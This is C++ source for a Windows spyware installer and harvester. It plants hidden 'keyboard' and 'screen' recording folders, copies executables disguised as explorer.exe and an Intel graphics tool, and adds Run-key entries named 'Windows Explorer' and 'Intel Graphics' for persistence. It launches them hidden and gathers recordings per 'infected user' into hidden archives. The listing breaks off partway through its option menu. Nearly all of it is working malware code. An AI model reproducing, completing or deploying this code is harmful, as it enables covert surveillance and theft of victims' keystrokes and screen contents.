/*****************************************************************************/
/*****************************************************************************/
/* ABOUT */

/* Portable. Install, harvest, uninstall, shred. */

/*****************************************************************************/
/*****************************************************************************/
/* PRAGMAS, DEFINITIONS AND HEADER FILES */

/*****************************************************************************/
#pragma once

/*****************************************************************************/

/*
 * Definition for blocking "safe code" warnings!
 * This function or variable may be unsafe. Consider using xxxxxx instead.
 * To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for
 * details.
 */

#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif // _MSC_VER

/*****************************************************************************/

/* Exclude rarely-used stuff from Windows headers. */

#define WIN32_LEAN_AND_MEAN

/*
 * If you need Win32 API features newer the Win95 and WinNT, then you must
 * define WINVER before including windows.h or any other method of including
 * the windef.h header.
 */

/* Next two lines are same! */
//#define _WIN32_WINNT 0x0500
#define WINVER 0x0500 /* Code works on Win(2k and successors) */

/*****************************************************************************/

#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <stdlib.h>
#include <iostream>
#include <shellapi.h>
#include <time.h>
#include <tchar.h>
#include <psapi.h>
#include <io.h>
#include <sys/types.h>
#include <sys/stat.h>

/*****************************************************************************/
/* CONSTANT DEFINITIONS */

/* LOCALAPPDATA */
/*****************************************************************************/
//#define CLN_EXE "cleanmgr.exe"

/* LOCALAPPDATA > EXPLORER */
/*****************************************************************************/
#define MAIN_DIR "Explorer"

/* LOCALAPPDATA > EXPLORER > SRC */
/*****************************************************************************/
#define SRC_DIR "src"

/* LOCALAPPDATA > EXPLORER > REC */
/*****************************************************************************/
#define REC_DIR "rec"
//#define AUD_DIR "audio"
//#define DOC_DIR "document"
//#define IMG_DIR "image"
#define KEY_DIR "keyboard"
#define SCR_DIR "screen"
//#define VID_DIR "video"
#define QKLOG_FILE "q_keyboard.lnk"
#define FKLOG_FILE "f_keyboard.lnk"

/* LOCALAPPDATA > EXPLORER > POST */
/*****************************************************************************/
//#define POST_DIR "post"
//#define POST_IN "in"
//#define POST_OUT "out"

/* LOCALAPPDATA > EXPLORER */
/*****************************************************************************/
//#define CPH_EXE "cipher.exe"
#define GFX_EXE "GfxUI.exe"
#define CPY_EXE "robocopy.exe"
#define EXP_EXE "explorer.exe"
//#define MGR_EXE "taskmgr.exe"
//#define TSC_EXE "mstsc.exe"
//#define VER_INI "v0.0.2.ini" // check before packing!

/*****************************************************************************/
/* C++ NAMESPACES */

using namespace std;

/*****************************************************************************/
/*****************************************************************************/
/* FUNCTION PROTOTYPES */

wchar_t* fnCharToWCharConverter(char *);
int fnDirectoryNotExistMessages(void);
int fnEnumProcesses(void);
int fnExplorerRegistryAdd(void);
int fnExplorerRegistryDelete(void);
char* fnGetCurrentWorkingDirectory(void);
char* fnGetRunningExeVolumeLabel(void);
char* fnGetThisExePath(void);
int fnGfxuiRegistryAdd(void);
int fnGfxuiRegistryDelete(void);
int fnHarvest(void);
int fnInfectSystemAndExecute(void);
bool fnIsDirectoryExists(LPCTSTR);
int fnOptionMenu(void);
void fnPrintProcessNameAndID(DWORD);
int fnUninstallAndShred(void);

/*****************************************************************************/
/*****************************************************************************/
/* char * to wchar * converter. */

wchar_t* fnCharToWCharConverter(char *chp)
{
    wchar_t *wp_chp = new wchar_t[strlen(chp) + 1];
    mbstowcs_s(NULL, wp_chp, strlen(chp) + 1, chp, strlen(chp));

    return wp_chp;
}

/*****************************************************************************/
/*****************************************************************************/

int fnDirectoryNotExistMessages(void)
{
    printf("Theese can be possible:\n\n"
        "1. Not installed yet!\n"
        "2. Installed but there are no records!\n"
        "3. Installed,\n"
        "   then terminated and uninstalled!\n"
        "   So, there are no records!\n");

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

int fnEnumProcesses(void)
{
    /* Get the list of process identifiers. */

    DWORD szProcesses[1024];
    DWORD cProcesses;
    DWORD cbNeeded;

    unsigned int i;

    /* https://docs.microsoft.com/en-us/windows/desktop/api/psapi/nf-psapi-enumprocesses */
    if(!EnumProcesses(szProcesses, sizeof(szProcesses), &cbNeeded))
    {
        return 1;
    }

    /* Calculate how many process identifiers were returned. */
    cProcesses = cbNeeded / sizeof(DWORD);

    /* Print the name and process identifier for each process. */
    for(i = 0; i < cProcesses; i++)
    {
        if(szProcesses[i] != 0)
        {
            fnPrintProcessNameAndID(szProcesses[i]);
        }
    }

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

int fnExplorerRegistryAdd(void) /* Autostart on system bootup! */
{
    /*************************************************************************/
    /* Gets localappdata path. */
    char* chpLocalAppdataPath = getenv("LOCALAPPDATA");

    /*************************************************************************/
    /* Assigns and stores GfxUI.exe path. */
    char szExplorerExePath[MAX_PATH] = { "" };

    strcat(szExplorerExePath, chpLocalAppdataPath);

    strcat(szExplorerExePath, "\\");
    strcat(szExplorerExePath, MAIN_DIR);
    strcat(szExplorerExePath, "\\");
    strcat(szExplorerExePath, EXP_EXE);

    /*************************************************************************/
    /* Adds and edits registry. */

    HKEY hKey; /* Registry key handle. WinDef.h */

    /*
     * winreg.h (include Windows.h)
     * Opens the specified registry key.
     * Note that key names are not case sensitive!
     */

    RegOpenKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);

    /*
     * winreg.h (include Windows.h)
     * Sets the data and type of a specified value under a registry key.
     * "Windows Explorer" is the string value of our program.
     * It can be also like this: "Windows Atapi x86_64 Driver"
     */

    RegSetValueExA(hKey, "Windows Explorer", 0, REG_SZ,
        (const unsigned char*)szExplorerExePath, MAX_PATH);

    /*
     * winreg.h (include Windows.h)
     * Closes handle to the specified registry key.
     */

    RegCloseKey(hKey);

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

int fnExplorerRegistryDelete(void)
{
    /* Deletes registry. */

    HKEY hKey = NULL; /* Registry key handle. WinDef.h */

    /*
     * winreg.h (include Windows.h)
     * Opens the specified registry key.
     * Note that key names are not case sensitive!
     */

    RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_ALL_ACCESS, &hKey);

    /*
     * winreg.h (include Windows.h)
     * Removes a named value from the specified registry key.
     * Note that value names are not case sensitive.
     */

    RegDeleteValue(hKey, TEXT("Windows Explorer"));

    /*
     * winreg.h (include Windows.h)
     * Closes handle to the specified registry key.
     */

    RegCloseKey(hKey);

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

char* fnGetCurrentWorkingDirectory(void)
{
    /* Gets robocopy exe's working directory. */
    char szCurrentWorkingDirectory[MAX_PATH];

    GetCurrentDirectoryA(MAX_PATH, szCurrentWorkingDirectory);

    return szCurrentWorkingDirectory;
}

/*****************************************************************************/
/*****************************************************************************/

char* fnGetRunningExeVolumeLabel(void)
{

    /* Gets runnning exe's drive label. */
    char szThisExeVolumeLabel[MAX_PATH] = {""};
    /* Gets exe's volume label char. (''E', 'F'... etc.) */
    strncat(szThisExeVolumeLabel, fnGetThisExePath(), 1);

    return szThisExeVolumeLabel;
}

/*****************************************************************************/
/*****************************************************************************/

char* fnGetThisExePath(void)
{
    char szThisExePath[MAX_PATH];

    /* Gets running exe's path. */
    GetModuleFileNameA(NULL, szThisExePath, MAX_PATH);

    return szThisExePath;
}

/*****************************************************************************/
/*****************************************************************************/

int fnGfxuiRegistryAdd(void) /* Autostart on system bootup! */
{
    /*************************************************************************/
    /* Gets localappdata path. */
    char* chpLocalAppdataPath = getenv("LOCALAPPDATA");

    /*************************************************************************/
    /* Assigns and stores GfxUI.exe path. */
    char szGfxuiExePath[MAX_PATH] = { "" };

    strcat(szGfxuiExePath, chpLocalAppdataPath);

    strcat(szGfxuiExePath, "\\");
    strcat(szGfxuiExePath, MAIN_DIR);
    strcat(szGfxuiExePath, "\\");
    strcat(szGfxuiExePath, GFX_EXE);

    /*************************************************************************/
    /* Adds and edits registry. */

    HKEY hKey; /* Registry key handle. WinDef.h */

    /*
     * winreg.h (include Windows.h)
     * Opens the specified registry key.
     * Note that key names are not case sensitive!
     */

    RegOpenKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);

    /*
     * winreg.h (include Windows.h)
     * Sets the data and type of a specified value under a registry key.
     * "Intel Graphics" is the string value of our program.
     * It can be also like this: "Windows Atapi x86_64 Driver"
     */

    RegSetValueExA(hKey, "Intel Graphics", 0, REG_SZ,
        (const unsigned char*)szGfxuiExePath, MAX_PATH);

    /*
     * winreg.h (include Windows.h)
     * Closes handle to the specified registry key.
     */

    RegCloseKey(hKey);

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

int fnGfxuiRegistryDelete(void)
{
    /* Deletes registry. */

    HKEY hkey = NULL; /* Registry key handle. WinDef.h */

    /*
     * winreg.h (include Windows.h)
     * Opens the specified registry key.
     * Note that key names are not case sensitive!
     */

    RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_ALL_ACCESS, &hkey);

    /*
     * winreg.h (include Windows.h)
     * Removes a named value from the specified registry key.
     * Note that value names are not case sensitive.
     */

    RegDeleteValueW(hkey, TEXT("Intel Graphics"));

    /*
     * winreg.h (include Windows.h)
     * Closes handle to the specified registry key.
     */

    RegCloseKey(hkey);

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

int fnHarvest(void)
{
    /* Gets localappdata path. */
    char* cpLocalAppdataPath = getenv("LOCALAPPDATA");

    /* assigns and stores rec path on system. */
    char szSystemRecPath[MAX_PATH] = {""};

    strcat(szSystemRecPath, cpLocalAppdataPath);

    strcat(szSystemRecPath, "\\");
    strcat(szSystemRecPath, MAIN_DIR);
    strcat(szSystemRecPath, "\\");
    strcat(szSystemRecPath, REC_DIR);

    /* Is rec' directory. exists on system? */

    /* At first, type conversion to char array to wchar_t array pointer. */
    wchar_t* wctpSystemRecPath = fnCharToWCharConverter(szSystemRecPath);

    /* Check file existens and assign. */
    bool bIsDirectoryExists = fnIsDirectoryExists(wctpSystemRecPath);

    /*
     * if != FALSE
     * so, lets make new archive from it.
     * else(directory does not exists), print message.
     */

    if(bIsDirectoryExists != FALSE)
    {
        char szHarvestStoragePath[MAX_PATH] = {""};
        char szRobocopyExeDirectoryPath[MAX_PATH] = {""};

        strcat(szRobocopyExeDirectoryPath, fnGetCurrentWorkingDirectory());
        strcat(szHarvestStoragePath, szRobocopyExeDirectoryPath);
        strcat(szHarvestStoragePath, "\\archive");

        CreateDirectoryA(szHarvestStoragePath, NULL);
        SetFileAttributesA(szHarvestStoragePath, FILE_ATTRIBUTE_HIDDEN);

        /* Gets computer name for specified archive directory. */
        char szComputerName[51];
        TCHAR tchComputerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD dwSize = sizeof(tchComputerName) / sizeof(tchComputerName[0]);
        GetComputerName(tchComputerName, &dwSize); /* fn return tchar! */
        /* tchar array to char array conversion. */
        wcstombs(szComputerName, tchComputerName, wcslen(tchComputerName) + 1);

        /* Gets user name for specified archive directory. */
        char szUsername[51];
        unsigned long ulUsernameLenght = 51;
        GetUserNameA(szUsername, &ulUsernameLenght);

        /* Gets and sets datetime for specified archive directory. */
        time_t time_tNow;
        char szTimeBuffer[51];
        struct tm *SpLocalTime;

        time(&time_tNow);
        SpLocalTime = localtime(&time_tNow);

        strftime(szTimeBuffer, 51, "%Y%m%d%H%M%S", SpLocalTime);

        /*
         * MAKES Archive > ComputerName\UserName' directory. ('Backup' subdir.)
         * Specified' directory. for each infected user.
         */

        char szComputerNameUserNamePath[MAX_PATH] = {""};
        strcat(szComputerNameUserNamePath, szHarvestStoragePath);
        strcat(szComputerNameUserNamePath, "\\");
        strcat(szComputerNameUserNamePath, szComputerName);
        strcat(szComputerNameUserNamePath, "-");
        strcat(szComputerNameUserNamePath, szUsername);

        CreateDirectoryA(szComputerNameUserNamePath, NULL);
        SetFileAttributesA(szComputerNameUserNamePath, FILE_ATTRIBUTE_HIDDEN);

        /*
         * MAKES ComputerName\UserName > datetime' directory. ('Computer\User' subdir.)
         * Specified' directory. for each infected user's harvesting datetime.
         */

        char szHarvestingDateTimePath[MAX_PATH] = {""};
        strcat(szHarvestingDateTimePath, szComputerNameUserNamePath);
        strcat(szHarvestingDateTimePath, "\\");
        strcat(szHarvestingDateTimePath, szTimeBuffer);

        CreateDirectoryA(szHarvestingDateTimePath, NULL);
        SetFileAttributesA(szHarvestingDateTimePath, FILE_ATTRIBUTE_HIDDEN);


        /* 
         * Copy
         * xcopy/robocopy command string concat
         * https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/xcopy
         */
        char szHarvestCommandArray[MAX_PATH] = {"xcopy "};
        strcat(szHarvestCommandArray, szSystemRecPath);
        strcat(szHarvestCommandArray, " ");
        strcat(szHarvestCommandArray, szHarvestingDateTimePath);
        strcat(szHarvestCommandArray, " /e /h /q /s");

        /*
         * Must explicitly flush, by using fflush or _flushall,
         * or close any stream before you call system.
         */

        _flushall();
        system(szHarvestCommandArray);
    }
    else
    {
        fnDirectoryNotExistMessages();
    }

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/
/* Creates install directories and copies executables inside them. */

int fnInfectSystemAndExecute(void)
{
    char szExplrrExePthForExecAftrInfctn[MAX_PATH] = {""};
    char szGfxuiExePthForExecAftrInfctn[MAX_PATH] = {""};

    char* cpLocalAppdataPath = getenv("LOCALAPPDATA");

    char szSysMainPath[MAX_PATH] = {""};
    strcat(szSysMainPath, cpLocalAppdataPath);
    strcat(szSysMainPath, "\\");
    strcat(szSysMainPath, MAIN_DIR);

    /* fileapi.h (include Windows.h) */
    if(CreateDirectoryA(szSysMainPath, NULL))
    {
        SetFileAttributesA(szSysMainPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */

        /* Makes 'Explorer > src' directory. ('Explorer' subdir.) */
        char szSysSrcPath[MAX_PATH] = {""};
        strcat(szSysSrcPath, szSysMainPath);
        strcat(szSysSrcPath, "\\");
        strcat(szSysSrcPath, SRC_DIR);
        CreateDirectoryA(szSysSrcPath, NULL);
        SetFileAttributesA(szSysSrcPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        /* Makes 'Explorer > rec' directory. ('Explorer' subdir.) */
        char szSysRecPath[MAX_PATH] = {""};
        strcat(szSysRecPath, szSysMainPath);
        strcat(szSysRecPath, "\\");
        strcat(szSysRecPath, REC_DIR);
        CreateDirectoryA(szSysRecPath, NULL);
        SetFileAttributesA(szSysRecPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        ///* Makes 'rec > audio' directory. ('rec' subdir.) */
        //char szSysAudRecPath[MAX_PATH] = {""};
        //strcat(szSysAudRecPath, szSysRecPath);
        //strcat(szSysAudRecPath, "\\");
        //strcat(szSysAudRecPath, AUD_DIR);
        //CreateDirectoryA(szSysAudRecPath, NULL);
        //SetFileAttributesA(szSysAudRecPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        ///* Makes 'rec > document' directory. ('rec' subdir.) */
        //char szSysDocRecPath[MAX_PATH] = {""};
        //strcat(szSysDocRecPath, szSysRecPath);
        //strcat(szSysDocRecPath, "\\");
        //strcat(szSysDocRecPath, DOC_DIR);
        //CreateDirectoryA(szSysDocRecPath, NULL);
        //SetFileAttributesA(szSysDocRecPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        ///* Makes 'rec > image' directory. ('rec' subdir.) */
        //char szSysImgRecPath[MAX_PATH] = {""};
        //strcat(szSysImgRecPath, szSysRecPath);
        //strcat(szSysImgRecPath, "\\");
        //strcat(szSysImgRecPath, IMG_DIR);
        //CreateDirectoryA(szSysImgRecPath, NULL);
        //SetFileAttributesA(szSysImgRecPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        /* Makes 'rec > keyboard' directory. ('rec' subdir.) */
        char szSysKeyRecPath[MAX_PATH] = {""};
        strcat(szSysKeyRecPath, szSysRecPath);
        strcat(szSysKeyRecPath, "\\");
        strcat(szSysKeyRecPath, KEY_DIR);
        CreateDirectoryA(szSysKeyRecPath, NULL);
        SetFileAttributesA(szSysKeyRecPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        /* Makes 'rec > screen' directory. ('rec' subdir.) */
        char szSysScrRecPath[MAX_PATH] = {""};
        strcat(szSysScrRecPath, szSysRecPath);
        strcat(szSysScrRecPath, "\\");
        strcat(szSysScrRecPath, SCR_DIR);
        CreateDirectoryA(szSysScrRecPath, NULL);
        SetFileAttributesA(szSysScrRecPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        ///* Makes 'rec > video' directory. ('rec' subdir.) */
        //char szSysVidRecPath[MAX_PATH] = {""};
        //strcat(szSysVidRecPath, szSysRecPath);
        //strcat(szSysVidRecPath, "\\");
        //strcat(szSysVidRecPath, VID_DIR);
        //CreateDirectoryA(szSysVidRecPath, NULL);
        //SetFileAttributesA(szSysVidRecPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        ///* Makes 'Explorer > post' directory. ('Explorer' subdir.) */
        //char szSysPostPath[MAX_PATH] = {""};
        //strcat(szSysPostPath, szSysMainPath);
        //strcat(szSysPostPath, "\\");
        //strcat(szSysPostPath, POST_DIR);
        //CreateDirectoryA(szSysPostPath, NULL);
        //SetFileAttributesA(szSysPostPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        ///* Makes 'post > in' directory. ('post' subdir.) */
        //char szSysPostInPath[MAX_PATH] = {""};
        //strcat(szSysPostInPath, szSysPostPath);
        //strcat(szSysPostInPath, "\\");
        //strcat(szSysPostInPath, POST_IN);
        //CreateDirectoryA(szSysPostInPath, NULL);
        //SetFileAttributesA(szSysPostInPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        ///* Makes 'post > out' directory. ('post' subdir.) */
        //char szSysPostOutPath[MAX_PATH] = {""};
        //strcat(szSysPostOutPath, szSysPostPath);
        //strcat(szSysPostOutPath, "\\");
        //strcat(szSysPostOutPath, POST_OUT);
        //CreateDirectoryA(szSysPostOutPath, NULL);
        //SetFileAttributesA(szSysPostOutPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */

        /*********************************************************************/
        /* EXE AND LNK COPIER TO SYSTEM */

        /* Gets robocopy exe's working' directory. */
        char szRobocopyExeDirectoryPath[MAX_PATH] = {""};
        strcat(szRobocopyExeDirectoryPath, fnGetCurrentWorkingDirectory());

        /* Copies cleanmgr.exe */

        //char szCopyClnmgrExeFrom[MAX_PATH] = {""};
        //strcat(szCopyClnmgrExeFrom, szRobocopyExeDirectoryPath);
        //strcat(szCopyClnmgrExeFrom, "\\src\\");
        //strcat(szCopyClnmgrExeFrom, CLN_EXE);

        //char szCopyClnmgrExeToLclppdt[MAX_PATH] = {""};
        //strcat(szCopyClnmgrExeToLclppdt, cpLocalAppdataPath);
        //strcat(szCopyClnmgrExeToLclppdt, "\\");
        //strcat(szCopyClnmgrExeToLclppdt, CLN_EXE);
        //CopyFileA(szCopyClnmgrExeFrom, szCopyClnmgrExeToLclppdt, 0);
        //SetFileAttributesA(szCopyClnmgrExeToLclppdt, FILE_ATTRIBUTE_HIDDEN);
        ///* Hidden. */

        //char szCopyClnmgrExeToSysSrc[MAX_PATH] = {""};
        //strcat(szCopyClnmgrExeToSysSrc, szSysMainPath);
        //strcat(szCopyClnmgrExeToSysSrc, "\\src\\");
        //strcat(szCopyClnmgrExeToSysSrc, CLN_EXE);
        //CopyFileA(szCopyClnmgrExeToLclppdt, szCopyClnmgrExeToSysSrc, 0);
        //SetFileAttributesA(szCopyClnmgrExeToSysSrc, FILE_ATTRIBUTE_HIDDEN);
        ///* Hidden. */

        /* Copies cipher.exe */

        //char szCopyCipherExeFrom[MAX_PATH] = {""};
        //strcat(szCopyCipherExeFrom, szRobocopyExeDirectoryPath);
        //strcat(szCopyCipherExeFrom, "\\src\\");
        //strcat(szCopyCipherExeFrom, CPH_EXE);

        //char szCopyCipherExeToSysMain[MAX_PATH] = {""};
        //strcat(szCopyCipherExeToSysMain, szSysMainPath);
        //strcat(szCopyCipherExeToSysMain, "\\");
        //strcat(szCopyCipherExeToSysMain, CPH_EXE);
        //CopyFileA(szCopyCipherExeFrom, szCopyCipherExeToSysMain, 0);
        //SetFileAttributesA(szCopyCipherExeToSysMain, FILE_ATTRIBUTE_HIDDEN);
        ///* Hidden. */

        //char szCopyCipherExeToSysSrc[MAX_PATH] = {""};
        //strcat(szCopyCipherExeToSysSrc, szSysMainPath);
        //strcat(szCopyCipherExeToSysSrc, "\\src\\");
        //strcat(szCopyCipherExeToSysSrc, CPH_EXE);
        //CopyFileA(szCopyCipherExeToSysMain, szCopyCipherExeToSysSrc, 0);
        //SetFileAttributesA(szCopyCipherExeToSysSrc, FILE_ATTRIBUTE_HIDDEN);
        ///* Hidden. */

        /* Copies GfxUI.exe */

        char szCopyGfxuiExeFrom[MAX_PATH] = {""};
        strcat(szCopyGfxuiExeFrom, szRobocopyExeDirectoryPath);
        strcat(szCopyGfxuiExeFrom, "\\src\\");
        strcat(szCopyGfxuiExeFrom, GFX_EXE);

        char szCopyGfxuiExeToSysMain[MAX_PATH] = {""};
        strcat(szCopyGfxuiExeToSysMain, szSysMainPath);
        strcat(szCopyGfxuiExeToSysMain, "\\");
        strcat(szCopyGfxuiExeToSysMain, GFX_EXE);
        CopyFileA(szCopyGfxuiExeFrom, szCopyGfxuiExeToSysMain, 0);
        SetFileAttributesA(szCopyGfxuiExeToSysMain, FILE_ATTRIBUTE_HIDDEN);
        /* Hidden. */

        char szCopyGfxuiExeToSysSrc[MAX_PATH] = {""};
        strcat(szCopyGfxuiExeToSysSrc, szSysMainPath);
        strcat(szCopyGfxuiExeToSysSrc, "\\src\\");
        strcat(szCopyGfxuiExeToSysSrc, GFX_EXE);
        CopyFileA(szCopyGfxuiExeToSysMain, szCopyGfxuiExeToSysSrc, 0);
        SetFileAttributesA(szCopyGfxuiExeToSysSrc, FILE_ATTRIBUTE_HIDDEN);
        /* Hidden. */

        strcat(szGfxuiExePthForExecAftrInfctn, szCopyGfxuiExeToSysMain);

        /* Copies robocopy.exe */

        char szCopyCpyExeFrom[MAX_PATH] = {""};
        strcat(szCopyCpyExeFrom, szRobocopyExeDirectoryPath);
        strcat(szCopyCpyExeFrom, "\\src\\");
        strcat(szCopyCpyExeFrom, CPY_EXE);

        char szCopyCpyExeToSysMain[MAX_PATH] = {""};
        strcat(szCopyCpyExeToSysMain, szSysMainPath);
        strcat(szCopyCpyExeToSysMain, "\\");
        strcat(szCopyCpyExeToSysMain, CPY_EXE);
        CopyFileA(szCopyCpyExeFrom, szCopyCpyExeToSysMain, 0);
        SetFileAttributesA(szCopyCpyExeToSysMain, FILE_ATTRIBUTE_HIDDEN);
        /* Hidden. */

        char szCopyCpyExeToSysSrc[MAX_PATH] = {""};
        strcat(szCopyCpyExeToSysSrc, szSysMainPath);
        strcat(szCopyCpyExeToSysSrc, "\\src\\");
        strcat(szCopyCpyExeToSysSrc, CPY_EXE);
        CopyFileA(szCopyCpyExeToSysMain, szCopyCpyExeToSysSrc, 0);
        SetFileAttributesA(szCopyCpyExeToSysSrc, FILE_ATTRIBUTE_HIDDEN);
        /* Hidden. */

        /* Copies explorer.exe */

        char szCopyExplrrExeFrom[MAX_PATH] = {""};
        strcat(szCopyExplrrExeFrom, szRobocopyExeDirectoryPath);
        strcat(szCopyExplrrExeFrom, "\\src\\");
        strcat(szCopyExplrrExeFrom, EXP_EXE);

        char szCopyExplrrExeToSysMain[MAX_PATH] = {""};
        strcat(szCopyExplrrExeToSysMain, szSysMainPath);
        strcat(szCopyExplrrExeToSysMain, "\\");
        strcat(szCopyExplrrExeToSysMain, EXP_EXE);
        CopyFileA(szCopyExplrrExeFrom, szCopyExplrrExeToSysMain, 0);
        SetFileAttributesA(szCopyExplrrExeToSysMain, FILE_ATTRIBUTE_HIDDEN);
        /* Hidden. */

        char szCopyExplrrExeToSysSrc[MAX_PATH] = {""};
        strcat(szCopyExplrrExeToSysSrc, szSysMainPath);
        strcat(szCopyExplrrExeToSysSrc, "\\src\\");
        strcat(szCopyExplrrExeToSysSrc, EXP_EXE);
        CopyFileA(szCopyExplrrExeToSysMain, szCopyExplrrExeToSysSrc, 0);
        SetFileAttributesA(szCopyExplrrExeToSysSrc, FILE_ATTRIBUTE_HIDDEN);
        /* Hidden. */

        strcat(szExplrrExePthForExecAftrInfctn, szCopyExplrrExeToSysMain);

        ///* Copies taskmgr.exe */

        //char szCopyTskmgrExeFrom[MAX_PATH] = {""};
        //strcat(szCopyTskmgrExeFrom, szRobocopyExeDirectoryPath);
        //strcat(szCopyTskmgrExeFrom, "\\src\\");
        //strcat(szCopyTskmgrExeFrom, MGR_EXE);

        //char szCopyTskmgrExeToSysMain[MAX_PATH] = {""};
        //strcat(szCopyTskmgrExeToSysMain, szSysMainPath);
        //strcat(szCopyTskmgrExeToSysMain, "\\");
        //strcat(szCopyTskmgrExeToSysMain, MGR_EXE);
        //CopyFileA(szCopyTskmgrExeFrom, szCopyTskmgrExeToSysMain, 0);
        //SetFileAttributesA(szCopyTskmgrExeToSysMain, FILE_ATTRIBUTE_HIDDEN);
        ///* Hidden. */

        //char szCopyTskmgrExeToSysSrc[MAX_PATH] = {""};
        //strcat(szCopyTskmgrExeToSysSrc, szSysMainPath);
        //strcat(szCopyTskmgrExeToSysSrc, "\\src\\");
        //strcat(szCopyTskmgrExeToSysSrc, MGR_EXE);
        //CopyFileA(szCopyTskmgrExeToSysMain, szCopyTskmgrExeToSysSrc, 0);
        //SetFileAttributesA(szCopyTskmgrExeToSysSrc, FILE_ATTRIBUTE_HIDDEN);
        ///* Hidden. */

        ///* Copies mstsc.exe */

        //char szCopyMstscExeFrom[MAX_PATH] = {""};
        //strcat(szCopyMstscExeFrom, szRobocopyExeDirectoryPath);
        //strcat(szCopyMstscExeFrom, "\\src\\");
        //strcat(szCopyMstscExeFrom, TSC_EXE);

        //char szCopyMstscExeToSysMain[MAX_PATH] = {""};
        //strcat(szCopyMstscExeToSysMain, szSysMainPath);
        //strcat(szCopyMstscExeToSysMain, "\\");
        //strcat(szCopyMstscExeToSysMain, TSC_EXE);
        //CopyFileA(szCopyMstscExeFrom, szCopyMstscExeToSysMain, 0);
        //SetFileAttributesA(szCopyMstscExeToSysMain, FILE_ATTRIBUTE_HIDDEN);
        ///* Hidden. */

        //char szCopyMstscExeToSysSrc[MAX_PATH] = {""};
        //strcat(szCopyMstscExeToSysSrc, szSysMainPath);
        //strcat(szCopyMstscExeToSysSrc, "\\src\\");
        //strcat(szCopyMstscExeToSysSrc, TSC_EXE);
        //CopyFileA(szCopyMstscExeToSysMain, szCopyMstscExeToSysSrc, 0);
        //SetFileAttributesA(szCopyMstscExeToSysSrc, FILE_ATTRIBUTE_HIDDEN);
        ///* Hidden. */

        ///* Copies vn.n.n.ini */

        //char szCopyVerIniFrom[MAX_PATH] = {""};
        //strcat(szCopyVerIniFrom, szRobocopyExeDirectoryPath);
        //strcat(szCopyVerIniFrom, "\\src\\");
        //strcat(szCopyVerIniFrom, VER_INI);

        //char szCopyVerIniToSysMain[MAX_PATH] = {""};
        //strcat(szCopyVerIniToSysMain, szSysMainPath);
        //strcat(szCopyVerIniToSysMain, "\\");
        //strcat(szCopyVerIniToSysMain, VER_INI);
        //CopyFileA(szCopyVerIniFrom, szCopyVerIniToSysMain, 0);
        //SetFileAttributesA(szCopyVerIniToSysMain, FILE_ATTRIBUTE_HIDDEN);
        ///* Hidden. */

        //char szCopyVerIniToSysSrc[MAX_PATH] = {""};
        //strcat(szCopyVerIniToSysSrc, szSysMainPath);
        //strcat(szCopyVerIniToSysSrc, "\\src\\");
        //strcat(szCopyVerIniToSysSrc, VER_INI);
        //CopyFileA(szCopyVerIniToSysMain, szCopyVerIniToSysSrc, 0);
        //SetFileAttributesA(szCopyVerIniToSysSrc, FILE_ATTRIBUTE_HIDDEN);
        ///* Hidden. */
    }

    /* .exe executions. */

    wchar_t* wctpExplrrExePthForExecAftrInfctn = fnCharToWCharConverter(szExplrrExePthForExecAftrInfctn);
    wchar_t* wctpGfxuiExePthForExecAftrInfctn = fnCharToWCharConverter(szGfxuiExePthForExecAftrInfctn);

    ShellExecute(NULL, NULL, wctpExplrrExePthForExecAftrInfctn, NULL, NULL, SW_HIDE);
    ShellExecute(NULL, NULL, wctpGfxuiExePthForExecAftrInfctn, NULL, NULL, SW_HIDE);

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

bool fnIsDirectoryExists(LPCTSTR absolutePath)
{
    if(_taccess_s(absolutePath, 0) == 0)
    {
        struct _stat status;
        _tstat(absolutePath, &status);
        return (status.st_mode & S_IFDIR) != 0;
    }

    return FALSE;
}

/*****************************************************************************/
/*****************************************************************************/

int fnOptionMenu(void)
{
    char cChoice = '0';

    do
    {
        /*
         * Must explicitly flush, by using fflush or _flushall,
         * or close any stream before you call system.
         */

        _flushall();
        system("cls");

        printf("[ OPTIONS ]\n"
            "========================================\n\n");
        printf(
            "1. Install\n"
            "2. Harvest\n"
            "3. Harvest - Uninstall - Shred\n"
            "4. Exit\n\n"
            "=========================================\n\n"
            "Choice: ");

        scanf(" %c", &cChoice);

        switch(cChoice)
        {
        case '1':
            /*
             * Must explicitly flush, by using fflush or _flushall,
             * or close any stream before you call system.
             */

            _flushall();
            system("cls");

            printf("[ 1. Install ]\n"
                "========================================\n\n");

            fnInfectSystemAndExecute();

            printf("\nDone! Hit a key to display main menu!\n");

            printf("=========================================\n\n");

            /*
             * Must explicitly flush, by using fflush or _flushall,
             * or close any stream before you call system.
             */

            _flushall();
            system("pause");

            break;
        case '2':
            /*
             * Must explicitly flush, by using fflush or _flushall,
             * or close any stream before you call system.
             */
